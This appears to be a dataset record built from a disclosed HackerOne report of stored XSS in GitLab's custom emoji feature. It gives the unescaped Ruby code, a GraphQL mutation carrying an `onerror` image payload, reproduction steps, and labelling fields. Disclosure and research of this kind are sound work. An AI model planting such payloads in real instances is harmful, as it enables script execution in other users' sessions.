@@ -1,0 +1,56 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "ooooooo_q ",
+  "title": "Stored XSS in custom emoji",
+  "content": "\nSummary\nI found Stored XSS with a feature of custom emoji.\nThis feature hasn't been rolled out yet and need to set feature flags in self management installation. ( https://gitlab.com/gitlab-org/gitlab/-/issues/231317 )\nThe problem is the code here.\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.11.4-ee/lib/gitlab/emoji.rb#L43\nCode 419 Bytes\n1    def emoji_image_tag(name, src)\n2      \"<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />\"\n3    end\n4\n5    ...\n6\n7    def custom_emoji_tag(name, image_source)\n8      data = {\n9        name: name\n10      }\n11\n12      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do\n13        emoji_image_tag(name, image_source).html_safe\n14      end\n15    end\nSince the src value of emoji_image_tag is not escaped, it will be XSS.\n(The value of name is not available for XSS as validation exists.)\nSteps to reproduce\nThe following steps should to be reproduced in a self-managed installation of gitlab.\nSet feature_flag\nsee https://docs.gitlab.com/ee/administration/feature_flags.html\nCode 449 Bytes\n1# gitlab-rails console\n2--------------------------------------------------------------------------------\n3 Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]\n4 GitLab:       13.11.3 (b321336e443) FOSS\n5 GitLab Shell: 13.17.0\n6 PostgreSQL:   12.6\n7--------------------------------------------------------------------------------\n8Loading production environment (Rails 6.0.3.6)\n9irb(main):001:0> Feature.enable(:custom_emoji)\n10=> true\nCreate group\nCreate a group to set the custom emoji. For example, xss_target.\nCreate custom emoji\nThe ability to create custom emoji only exists in graphql api.\nCreate by sending the following query from the graphiql page of https://localhost/-/graphql-explorer.\nCode 231 Bytes\n1mutation {\n2  createCustomEmoji(input: \n3    {\n4      groupPath: \"xss_target\", \n5      name:\"xssreplace\",\n6      url:\"http://aaa#'><img onerror=alert(location) src=.>\"\n7    }) {\n8    customEmoji {\n9      id\n10      name\n11      url\n12    }\n13  }\n14}\n<image_0>\nCreate project and file\nCreate a project to display custom emojis and create a README.md with the following content.\nCode 12 Bytes\n1:xssreplace:\nView rendering results in browser\nThe function of custom emoji replaces the :xssreplace: part to become Stored XSS.\nImpact\nStored XSS is possible with gitlab with feature flags set.\nExamples\nThere is no example because it works only with gitlab with feature flag set.\nWhat is the current bug behavior?\nInsufficient escape of src.\nWhat is the expected correct behavior?\nEscape the value of src.\nRelevant logs and/or screenshots\n<image_1>\nOutput of checks\nGitLab.com doesn't have a feature flag set so it doesn't affect.\nResults of GitLab environment info\nCode 840 Bytes\n1# gitlab-rake gitlab:env:info\n2\n3System information\n4System:\n5Current User:\tgit\n6Using RVM:\tno\n7Ruby Version:\t2.7.2p137\n8Gem Version:\t3.1.4\n9Bundler Version:2.1.4\n10Rake Version:\t13.0.3\n11Redis Version:\t6.0.12\n12Git Version:\t2.31.1\n13Sidekiq Version:5.2.9\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t13.11.3\n18Revision:\tb321336e443\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t12.6\n22URL:\t\thttps://gitlab.example.com\n23HTTP Clone URL:\thttps://gitlab.example.com/some-group/some-project.git\n24SSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers:\n28\n29GitLab Shell\n30Version:\t13.17.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n34Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nStored XSS is possible with gitlab with feature flags set.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 3000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t2mdzeskto9otmzhd090fewakcag?response-content-disposition=attachment%3B%20filename%3D%22graphql.png%22%3B%20filename%2A%3DUTF-8%27%27graphql.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4THEFA5D%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T192321Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA%2FmPasm3e%2B19iYq8ElMfUlBHfCf6hlXlZIXFhTG6MsyAiA22QrvM1KyqD2QsQPlvEB5%2BqWhlwUVotrDfZ53lEo%2FwSqyBQgbEAMaDDAxMzYxOTI3NDg0OSIMp2KwBQXeE9h770PMKo8F2LsCKqJJekXmGYpoE3BMHakxy0DuOEoxo%2FRth%2BpPUahbaR4h4NfxMSEHG4yYJFrDfhifa0VJ1tExh20vARZQFhJGsx6AGuBVoIWIUTGIXfSokr8PnPDb6HbDx72p3Y5U793ruMsTrfXTJgvJNn7wmPvIi6cScEn6eSvBEb7ALVamM9aSLLie%2FIIB3Pohl4kFNE57dyq6a2whlTUHbzYxlhklVXsex4nQ%2BX1BAlfc85T17OPewfEhHrhgVqYGXfLpaeBzZxEEgZwVJRZnu233bFRpuZL5k9KmZB0ZBQWC7mJKCeHqXoODzjFMoWokeXZwLf1qUNEtSW5VUkFWQufOhkbKJMSboIPt6ql8DQlkzhmSNhQkAhqCtFHtRlJi3UXykxDW07%2FEcfTfmfUilVdogKxQVmbqvV8%2FDXapSnbWCJyBCFeEt0KZRsTlCIn3z2QWN0CcaEr2oauE6vcCuHDOAzX8x5PbXGgK2o0XfDL58vKV%2B0NlORnv7BwHJy3gyJFam%2FkhiJTHbd4ElgG%2FnWqoo13ioV1VIZTaQh7Gwv6hJhKyrHTZQElF%2FPZDI3IsnKKKq4qReoy51Gqe9s17ZrK%2BKlcs6WnFZPspohVhTI6L2%2BdQDThzVEOA%2FdQy9zdfsXDjguDvvzMWvmENdzBQLrfT2nls43AIwnfblCgoxCAtEBHH%2B06giDFvCWsP47XN2tavYho7M0fqXRex6NZ0lMAQjAbjuaJwldBGjyUIJINjJC1IxXemIiJuTeQSeWt06F3qDzGfI7iWqR6Dovn%2Bxkl23yz0E%2FRHic0ABTenPEMDwZGrfxjW2gJChxPvwdyfCVkB6lKFdKf1k6GW3eaxq%2BweEHrftVBMBuOCNSp8y5ss7jDP5Iu%2FBjqyAT2lA1l32Xsa1doyemZyuyklW3hBQObQzaOIfqt0REpbgA3YlNeNDY%2FkG2EfBfEKNOzR3tA9Zrm2ez4mWkd%2Bnk5noQO3a%2BZPiazIpR%2BEpY%2BXtIl9sxj%2BCoFt5NyVydIeQ47wXtKqKb9zoJSrY5ITBK%2B%2Fe%2FZfrAV9fXkTL3L%2Fc%2FL6wa0dSeA8FrTsTDvql7F4gEm%2Fvt3XNhGi7ISupxr5ryFPnBfNO9isedAQIjSmkxPVWhI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5375668b2c0d9024700fae96c5721376cdefe92f8d28dd463c00f830f28e84d9",
+    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uu2zrxl3kbpuqj36odcqpcvh2mzm?response-content-disposition=attachment%3B%20filename%3D%22custom_emoji_xss.png%22%3B%20filename%2A%3DUTF-8%27%27custom_emoji_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4THEFA5D%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T192321Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA%2FmPasm3e%2B19iYq8ElMfUlBHfCf6hlXlZIXFhTG6MsyAiA22QrvM1KyqD2QsQPlvEB5%2BqWhlwUVotrDfZ53lEo%2FwSqyBQgbEAMaDDAxMzYxOTI3NDg0OSIMp2KwBQXeE9h770PMKo8F2LsCKqJJekXmGYpoE3BMHakxy0DuOEoxo%2FRth%2BpPUahbaR4h4NfxMSEHG4yYJFrDfhifa0VJ1tExh20vARZQFhJGsx6AGuBVoIWIUTGIXfSokr8PnPDb6HbDx72p3Y5U793ruMsTrfXTJgvJNn7wmPvIi6cScEn6eSvBEb7ALVamM9aSLLie%2FIIB3Pohl4kFNE57dyq6a2whlTUHbzYxlhklVXsex4nQ%2BX1BAlfc85T17OPewfEhHrhgVqYGXfLpaeBzZxEEgZwVJRZnu233bFRpuZL5k9KmZB0ZBQWC7mJKCeHqXoODzjFMoWokeXZwLf1qUNEtSW5VUkFWQufOhkbKJMSboIPt6ql8DQlkzhmSNhQkAhqCtFHtRlJi3UXykxDW07%2FEcfTfmfUilVdogKxQVmbqvV8%2FDXapSnbWCJyBCFeEt0KZRsTlCIn3z2QWN0CcaEr2oauE6vcCuHDOAzX8x5PbXGgK2o0XfDL58vKV%2B0NlORnv7BwHJy3gyJFam%2FkhiJTHbd4ElgG%2FnWqoo13ioV1VIZTaQh7Gwv6hJhKyrHTZQElF%2FPZDI3IsnKKKq4qReoy51Gqe9s17ZrK%2BKlcs6WnFZPspohVhTI6L2%2BdQDThzVEOA%2FdQy9zdfsXDjguDvvzMWvmENdzBQLrfT2nls43AIwnfblCgoxCAtEBHH%2B06giDFvCWsP47XN2tavYho7M0fqXRex6NZ0lMAQjAbjuaJwldBGjyUIJINjJC1IxXemIiJuTeQSeWt06F3qDzGfI7iWqR6Dovn%2Bxkl23yz0E%2FRHic0ABTenPEMDwZGrfxjW2gJChxPvwdyfCVkB6lKFdKf1k6GW3eaxq%2BweEHrftVBMBuOCNSp8y5ss7jDP5Iu%2FBjqyAT2lA1l32Xsa1doyemZyuyklW3hBQObQzaOIfqt0REpbgA3YlNeNDY%2FkG2EfBfEKNOzR3tA9Zrm2ez4mWkd%2Bnk5noQO3a%2BZPiazIpR%2BEpY%2BXtIl9sxj%2BCoFt5NyVydIeQ47wXtKqKb9zoJSrY5ITBK%2B%2Fe%2FZfrAV9fXkTL3L%2Fc%2FL6wa0dSeA8FrTsTDvql7F4gEm%2Fvt3XNhGi7ISupxr5ryFPnBfNO9isedAQIjSmkxPVWhI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6b044492dbdc205eec5e7433f8e4e2097f97c3fc89808b784e446d69151c7d8d"
+  },
+  "disclosed_date": 1626714360,
+  "report_url": "https://hackerone.com/reports/1198517",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Enable the custom emoji feature flag in a self-managed GitLab installation using the GitLab Rails console: `Feature.enable(:custom_emoji)`."
+    ],
+    [
+      2,
+      "Create a custom emoji via GraphQL mutation with a malicious URL payload: `mutation { createCustomEmoji(input: { groupPath: \"xss_target\", name:\"xssreplace\", url:\"http://aaa#'><img onerror=alert(location) src=.>\" }) { customEmoji { id name url } } }`."
+    ],
+    [
+      3,
+      "Use the custom emoji in a project file (e.g., README.md) with the syntax `:xssreplace:`."
+    ],
+    [
+      4,
+      "View the rendered file in a browser to trigger the XSS payload."
+    ]
+  ],
+  "vuln_description": "A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's custom emoji feature due to insufficient escaping of the `src` attribute in the `emoji_image_tag` function. This allows an attacker to inject malicious JavaScript code via a crafted emoji URL, which is executed when the emoji is rendered in the browser.",
+  "reason": "The vulnerability involves enabling a feature flag, crafting a GraphQL mutation, and understanding the rendering context of custom emojis. While the steps are straightforward, the need to enable a feature flag and use GraphQL adds some complexity.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a stored XSS in a custom emoji feature where the 'src' attribute is not properly escaped. This is a client-side rendering issue rather than an authentication or authorization bypass. The methodology described focuses on testing different user sessions and resource IDs for authN/authZ issues, not on input sanitization or rendering vulnerabilities.",
+    "is_detectable": false
+  }
+}
